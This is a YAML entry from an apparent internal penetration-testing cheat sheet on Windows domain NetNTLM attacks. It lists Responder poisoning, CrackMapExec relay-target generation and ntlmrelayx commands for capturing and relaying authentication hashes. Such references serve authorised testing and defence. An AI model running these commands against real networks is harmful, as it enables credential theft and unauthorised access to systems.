name: windows_responder_relay

info:
  title: Windows Domain NetNTLM (Reponder & Relay)
  author: evait security GmbH
  book: internal-pentest
  category: 04_windows_domain
  placeholder:
  references:
    - https://github.com/lgandx/Responder
    - https://byt3bl33d3r.github.io/practical-guide-to-ntlm-relaying-in-2017-aka-getting-a-foothold-in-under-5-minutes.html
    - https://github.com/SecureAuthCorp/impacket/blob/master/examples/ntlmrelayx.py

content: |
  <h3>Responder</h3>
  <p>Analyzing mode<p>
  <code>sudo responder -I eth0 -A</code>
  <p>Redirect / Answering mode (capture hashes only)<p>
  <code>sudo responder -I eth0 -wrf</code>
  <h3>Relay</h3>
  <p>Generating a relay target list (optional)</p>
  <code>cme smb <span class="highlight">RHOSTS</span> --gen-relay-list /tmp/relay_targets.txt</code>
  <p>Relay incoming authentication attempts to targets and save hashes to /tmp/ntlm_relay_out</p>
  <code>ntlmrelayx.py -tf /tmp/relay_targets.txt --output-file /tmp/ntlm_relay_out -smb2support</code>
  <code>sudo responder -I eth0 -wrf</code>